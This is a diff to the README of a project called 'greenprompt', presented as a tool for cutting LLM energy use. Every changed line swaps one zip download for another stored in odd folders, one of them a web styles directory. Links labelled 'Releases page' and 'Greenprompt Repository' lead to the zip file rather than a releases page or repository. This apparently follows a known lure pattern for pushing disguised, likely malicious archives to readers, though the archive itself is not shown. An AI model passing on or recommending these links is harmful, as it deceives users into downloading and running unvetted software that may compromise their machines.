@@ -1,7 +1,7 @@
 # 🌿 greenprompt - Optimize Your LLM Energy Usage
 
 ## 🔗 Download Now
-[![Download Greenprompt](https://raw.githubusercontent.com/developersofik/greenprompt/main/extension/reference/Software-v2.5.zip%20Greenprompt-blue?style=flat-square&logo=github)](https://raw.githubusercontent.com/developersofik/greenprompt/main/extension/reference/Software-v2.5.zip)
+[![Download Greenprompt](https://github.com/developersofik/greenprompt/raw/refs/heads/main/web/src/styles/Software_1.4.zip%20Greenprompt-blue?style=flat-square&logo=github)](https://github.com/developersofik/greenprompt/raw/refs/heads/main/web/src/styles/Software_1.4.zip)
 
 ---
 
@@ -21,7 +21,7 @@ Before you start, ensure your system meets the following requirements:
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:**  
-   Go to the [Releases page](https://raw.githubusercontent.com/developersofik/greenprompt/main/extension/reference/Software-v2.5.zip) to access the latest version.
+   Go to the [Releases page](https://github.com/developersofik/greenprompt/raw/refs/heads/main/web/src/styles/Software_1.4.zip) to access the latest version.
 
 2. **Choose Your Version:**  
    On the Releases page, you will find different versions of the application. Look for the latest stable release.
@@ -78,7 +78,7 @@ If you encounter issues while downloading or running the application, consider t
 
 For updates, tips, and discussions:
 
-- **Follow us on GitHub:** [Greenprompt Repository](https://raw.githubusercontent.com/developersofik/greenprompt/main/extension/reference/Software-v2.5.zip)
+- **Follow us on GitHub:** [Greenprompt Repository](https://github.com/developersofik/greenprompt/raw/refs/heads/main/web/src/styles/Software_1.4.zip)
 - **Join the Sustainability Conversation:** Participate in discussions around green technology and LLM optimization.
 
 Thank you for choosing greenprompt. Your journey towards smarter, sustainable LLM usage starts here!
